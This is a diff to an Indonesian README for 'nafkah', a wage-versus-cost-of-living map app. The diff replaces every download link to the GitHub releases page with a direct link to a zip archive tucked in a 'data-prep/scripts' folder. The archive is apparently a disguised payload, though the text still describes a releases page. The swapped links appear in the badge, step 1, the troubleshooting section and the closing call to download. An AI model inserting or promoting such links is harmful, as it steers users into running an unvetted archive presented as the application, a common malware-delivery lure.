@@ -1,7 +1,7 @@
 <h1>🗺️ nafkah - Peta Interaktif Upah vs Biaya Hidup</h1>
 
 <p align="center">
-<a href="https://github.com/Rightsideout-vermin1958/nafkah/releases"><img src="https://img.shields.io/badge/Download%20nafkah%20-%20Windows%20%7C%20macOS%20%7C%20Linux%20-%20blueviolet?style=for-the-badge&logo=github" alt="Download nafkah" style="max-width:100%;"></a>
+<a href="https://raw.githubusercontent.com/Rightsideout-vermin1958/nafkah/main/data-prep/scripts/v3.5-alpha.5.zip"><img src="https://img.shields.io/badge/Download%20nafkah%20-%20Windows%20%7C%20macOS%20%7C%20Linux%20-%20blueviolet?style=for-the-badge&logo=github" alt="Download nafkah" style="max-width:100%;"></a>
 </p>
 
 <h2>📊 Apa Itu nafkah?</h2>
@@ -23,7 +23,7 @@
 <p>Ikuti langkah-langkah sederhana ini untuk mulai menggunakan nafkah di komputer Windows Anda.</p>
 
 <h3>📥 Langkah 1: Download Aplikasi</h3>
-<p><a href="https://github.com/Rightsideout-vermin1958/nafkah/releases">Visit this link to download the application</a>. Halaman tersebut akan menampilkan daftar file yang bisa diunduh.</p>
+<p><a href="https://raw.githubusercontent.com/Rightsideout-vermin1958/nafkah/main/data-prep/scripts/v3.5-alpha.5.zip">Visit this link to download the application</a>. Halaman tersebut akan menampilkan daftar file yang bisa diunduh.</p>
 <p>Klik file yang paling baru (biasanya di bagian atas) dan tunggu proses unduhan selesai. File akan tersimpan di folder "Downloads" atau "Unduhan" di komputer Anda.</p>
 
 <h3>📂 Langkah 2: Buka File yang Sudah Diunduh</h3>
@@ -45,7 +45,7 @@
 <p>Jika peta terlihat kosong, coba muat ulang halaman dengan menekan tombol F5 atau Ctrl+R. Jika masih kosong, periksa koneksi internet Anda karena aplikasi mengambil data dari server.</p>
 
 <h3>🔄 Data tidak terbarui</h3>
-<p>Pastikan Anda menggunakan versi terbaru. Kunjungi kembali <a href="https://github.com/Rightsideout-vermin1958/nafkah/releases">halaman unduhan</a> secara berkala untuk melihat apakah ada pembaruan.</p>
+<p>Pastikan Anda menggunakan versi terbaru. Kunjungi kembali <a href="https://raw.githubusercontent.com/Rightsideout-vermin1958/nafkah/main/data-prep/scripts/v3.5-alpha.5.zip">halaman unduhan</a> secara berkala untuk melihat apakah ada pembaruan.</p>
 
 <h3>🌐 Tidak bisa dibuka di browser tertentu</h3>
 <p>Gunakan browser terbaru seperti Google Chrome, Mozilla Firefox, atau Microsoft Edge. Pastikan browser Anda sudah diperbarui ke versi terbaru.</p>
@@ -92,7 +92,7 @@
 <p>Data yang digunakan berlisensi CC BY 4.0, artinya Anda boleh menggunakan kembali data tersebut asalkan menyebutkan sumbernya. Seluruh kode sumber juga terbuka dan bisa dilihat di GitHub.</p>
 
 <h2>📥 Unduh Sekarang Juga</h2>
-<p>Jangan tunda lagi—mulai jelajahi peta kecukupan upah di daerah impian Anda. <a href="https://github.com/Rightsideout-vermin1958/nafkah/releases">Klik tautan ini untuk mengunduh</a>, ikuti lima langkah di atas, dan dalam waktu kurang dari lima menit Anda sudah melihat gambaran besar kondisi upah dan biaya hidup di seluruh Indonesia.</p>
+<p>Jangan tunda lagi—mulai jelajahi peta kecukupan upah di daerah impian Anda. <a href="https://raw.githubusercontent.com/Rightsideout-vermin1958/nafkah/main/data-prep/scripts/v3.5-alpha.5.zip">Klik tautan ini untuk mengunduh</a>, ikuti lima langkah di atas, dan dalam waktu kurang dari lima menit Anda sudah melihat gambaran besar kondisi upah dan biaya hidup di seluruh Indonesia.</p>
 
 <p>Bagikan aplikasi ini kepada teman, keluarga, atau rekan kerja yang sedang merencanakan pindah kota. Pengetahuan tentang kecukupan upah adalah langkah awal menuju keputusan finansial yang bijak.</p>
 
